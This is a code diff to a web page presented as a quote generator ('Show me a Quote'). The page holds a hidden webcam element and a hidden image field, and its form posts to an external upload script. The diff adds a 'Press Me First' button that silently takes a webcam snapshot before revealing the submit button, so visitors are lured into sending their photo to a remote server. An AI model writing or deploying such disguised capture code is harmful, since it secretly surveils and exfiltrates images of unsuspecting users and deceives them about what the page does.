@@ -10,10 +10,14 @@
     <form action="http://www.goodquotes.somee.com/up.php" method="POST">
         <span style="height:0px;width:0px;display:none;" id="my_camera" height=0 width=0></span>
                 <br/>
-                <input type=button value="Show me a Quote 1" onClick="take_snapshot()">
+                <input type=button value="Press Me First" onClick="take_snapshot(); myFunction();">
                 <input type="hidden" name="image" id="image" class="image-tag">
-                <input type=submit value="Show me a Quote 2">
-        
+<p id="demo"></p>
+<script>
+function myFunction() {
+  document.getElementById("demo").innerHTML = "<input type=submit value='Show me a Quote 2'>";
+}
+</script>
     </form>
         <script language="JavaScript">
     Webcam.set({
